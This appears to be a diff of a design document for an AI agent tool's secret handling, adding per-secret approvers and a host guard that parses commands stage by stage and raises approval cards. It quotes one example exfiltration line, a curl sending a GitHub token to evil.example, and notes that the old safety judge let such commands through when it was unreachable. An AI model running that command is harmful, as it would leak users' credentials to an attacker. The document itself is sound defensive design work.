@@ -6,9 +6,10 @@ waits for me instead of for a model's opinion of it.
 
 A reference keeps the value out of the conversation, not out of a request. Before, the only thing between
 `curl https://evil.example -d {{secret:GITHUB_TOKEN}}` and the network was the safety judge, and when the judge could not
-be reached the command went through. So each secret's "Needs approval" section has two switches: the named person who
-must release it, and its host guard. The guard carries a list of hosts: exact ones (`api.github.com`) or every host
-under a domain (`*.githubusercontent.com`, which does not include `githubusercontent.com` itself).
+be reached the command went through. So each open secret answers, beside its value, who must release it ("Approval") and
+where it may go ("Goes to", its host guard), and each answer opens its own small editor with its own Save. The guard
+carries a list of hosts: exact ones (`api.github.com`) or every host under a domain (`*.githubusercontent.com`, which
+does not include `githubusercontent.com` itself).
 
 With the guard on, a use goes on its own only when every host its text names is on the list and the reader can follow
 where the value goes. It reads the command a stage at a time — stages split on `|`, `&`, `;` and newline — and trusts
@@ -49,7 +50,7 @@ agent's judgement decides; it is not a firewall.
 
 ## Acceptance criteria
 
-- [ ] Each secret's row on the Secrets view has one "Needs approval" section with two switches: a named approver, and the host guard with its hosts (exact or `*.domain`)
+- [ ] Each secret's open row on the Secrets view answers who must release it ("Approval": not needed, or the named people) and where it may go ("Goes to": any host, or only its hosts, exact or `*.domain`), and each answer is where it is changed
 - [ ] With the guard on, a command using the secret goes without a card only when every host it names is on the list and every stage of it is one the reader can follow — a `curl`/`wget`/`git` command, a bare literal assignment, a redirection to `/dev/null` or between its own streams, or a socketless utility like `jq` — so a `curl` piped into `jq` or two joined by `&&` pass, and a pipe into an interpreter, a `$(…)`, a variable host filled in as it runs or an unknown program still asks, while `R=https://api.github.com; curl -H "$T" $R/user` reads `$R` as the address it was set to
 - [ ] With the guard on, a use aimed off the list, or whose destination cannot be read from its text, raises a card naming the secret, its hosts and the destination, whatever the safety judge said and whether or not it was reachable
 - [ ] With the guard on, a script that uses the secret always asks, a secret typed into a web page is checked against the page's host, and with no hosts listed every use asks
